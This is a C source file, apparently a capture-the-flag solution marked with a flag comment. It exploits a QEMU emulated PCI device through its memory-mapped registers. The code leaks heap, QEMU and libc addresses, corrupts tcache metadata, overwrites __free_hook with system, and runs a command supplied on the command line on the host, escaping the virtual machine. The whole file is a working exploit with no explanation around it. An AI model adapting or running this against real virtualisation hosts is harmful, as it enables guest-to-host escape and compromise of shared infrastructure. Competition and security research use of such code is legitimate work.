// rwctf{OhhohohO_yoU_Got_mE}
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>

#define PFN_MASK ((1ULL << 55) - 1)

uintptr_t v2p(void *p)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return -1;
    }
    if (lseek(fd, (uintptr_t)p / 0x1000 * 8, SEEK_SET) < 0) {
        perror("lseek");
        return -1;
    }
    uint64_t val = 0;
    if (read(fd, &val, 8) != 8) {
        perror("read");
        return -1;
    }
    val &= PFN_MASK;
    val *= 0x1000;
    printf("paddr %#lx\n", val);
    return val;
}

int main(int argc, char **argv) {
    if (argc <= 1) {
        return -1;
    }

    const char *path = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
    int fd = open(path, O_RDWR | O_SYNC);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    void *uptr = mmap((void*)NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    memset(uptr, 0x41, 0x1000);
    uint32_t kptr = (uint32_t)v2p(uptr);

    void *ptr = mmap((void*)0x40000000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return -1;
    }
    volatile uint32_t *size = (volatile uint32_t *)ptr;
    volatile uint32_t *addr = (volatile uint32_t *)(ptr + 4);
    volatile uint32_t *result_addr = (volatile uint32_t *)(ptr + 8);
    volatile uint32_t *idx = (volatile uint32_t *)(ptr + 0xc);
    volatile uint32_t *request = (volatile uint32_t *)(ptr + 0x10);
    volatile uint32_t *create = (volatile uint32_t *)(ptr + 0x14);
    volatile uint32_t *delete = (volatile uint32_t *)(ptr + 0x18);
    uint64_t *leak = NULL;

    const uint32_t fun_mem_base = 0xfebf1000;

    // leak heap
    *size = 0x1000;
    *addr = kptr;
    *result_addr = fun_mem_base + 0x18;
    *idx = 1;
    *create = 1;
    *request;
    leak = (uint64_t *)(uptr + 0x400);
    printf("leak %#lx %#lx %#lx %#lx\n", leak[0], leak[1], leak[2], leak[3]);
    uint64_t tcache = leak[1];
    uint64_t reg = leak[2];

    // keep order
    *size = 0x1000;
    *create = 1;
    *delete = 1;

    // prepare payload
    *size = 0x1000;
    *create = 1;
    *result_addr = 0; // no delete
    *idx = 1;
    memset(leak, 0, 0x400);
    leak[6] = 0;
    leak[7] = 0x415;
    leak[8] = reg + 0x10;
    leak[9] = tcache;
    leak[10] = 0;
    leak[11] = 0x415;
    leak[12] = reg + 0x50;
    leak[13] = tcache;
    *request = 1;

    // leak base
    *result_addr = fun_mem_base + 0x18;
    *idx = 0;
    *request;
    leak = (uint64_t *)uptr;
    uint64_t tcg_ptr = leak[0x310 / 8];
    uint64_t qemu_base = tcg_ptr - 0x110dd80;
    uint64_t system_plt = qemu_base + 0x2B8A74;
    uint64_t getenv_got = qemu_base + 0x100DA40;
    printf("tcg ptr %#lx qemu base %#lx\n", tcg_ptr, qemu_base);

    // write tcache
    leak[0x278 / 8] = reg + 0x70;
    *size = 0x1000;
    *create = 1;
    *request = 1;

    // alloc new request
    *size = 0x800;
    // getchar();
    *create = 1;

    *result_addr = 0; // no delete

#define SETBASE(base) do { \
    *idx = 0; \
    uint64_t *p = uptr; \
    memset(p, 0, 0x400); \
    p[3] = 0x415; \
    p[4] = -1; \
    p[5] = reg + 0x50; \
    p[6] = base; \
    *request = 1; \
} while (0)

    SETBASE(getenv_got);

    *idx = 1;
    *request;
    leak = (uint64_t *)(uptr + 0x400);
    uint64_t libc_getenv = leak[0];
    uint64_t libc_base = libc_getenv - 0x49020;
    uint64_t free_hook = libc_base + 0x1eeb28;
    printf("libc_getenv = %#lx libc_base = %#lx free_hook = %#lx\n", libc_getenv, libc_base, free_hook);

    SETBASE(free_hook);
    *idx = 1;
    *request;
    leak[0] = system_plt;
    *request = 1;

    SETBASE(reg + 0x200);
    *idx = 1;
    *request;
    strcpy((void *)leak, argv[1]);
    *request = 1;

    // getchar();
    *delete = 1;

    return 0;
}
